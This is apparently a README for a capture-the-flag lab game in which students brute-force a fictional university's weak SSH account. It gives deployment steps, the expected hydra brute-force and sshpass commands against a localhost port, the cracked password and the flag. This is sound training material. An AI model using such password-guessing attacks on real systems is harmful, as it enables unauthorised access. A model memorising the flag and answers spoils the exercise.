# ssh-weak-v3 — SSH Brute-Force (Academic Sector / OSINT-Driven)

**Vulnerability:** Weak SSH credentials predictable from the organisation's public context  
**Tool:** `hydra`  
**Flag:** `WMG{c4mpus_pw_t00_pr3d1ct4bl3}`

## Scenario

Crestwood University IT helpdesk uses an `itstaff` account with a predictable
campus-style password. A sector-specific wordlist (`campus-passwords.txt`) is
derived from university naming conventions (year + capitalised term). Students
enumerate services, identify the SSH account, and brute-force it using OSINT-
informed guessing before retrieving the support ticket export (flag).

This game is a fresh variant of `ssh-weak-password` and `ssh-weak-v2`: different
sector (academia), different username (`itstaff`), different lore, and a campus-
themed wordlist — teaching the OSINT angle of credential attacks.

## Deploy

```bash
ansible-playbook -i inventory/hosts.ini games/ssh-weak-v3/setup.yml
```

First run: `ok=7 changed=4`  
Second run: `ok=7 changed=0` (idempotent)

## Verify

```bash
./agent-harness/verify.sh ssh-weak-v3
```

## Expected exploit

```bash
hydra -l itstaff -P games/ssh-weak-v3/files/campus-passwords.txt \
  ssh://127.0.0.1 -s 2222
# → [22][ssh] login: itstaff   password: Campus2024

sshpass -p Campus2024 ssh -p 2222 itstaff@127.0.0.1 'cat ~/ticket-export.txt'
# → WMG{c4mpus_pw_t00_pr3d1ct4bl3}
```

## Training

`training.json` — 9 levels: OSINT → port scan → account enumeration → sector-informed wordlist → hydra → SSH access → flag → ASSESSMENT.  
MITRE ATT&CK: T1589.001 (Gather Victim Identity Information: Credentials), T1110.001 (Brute Force: Password Guessing).  
CyberRangeCZ subnet: 10.1.35.0/24
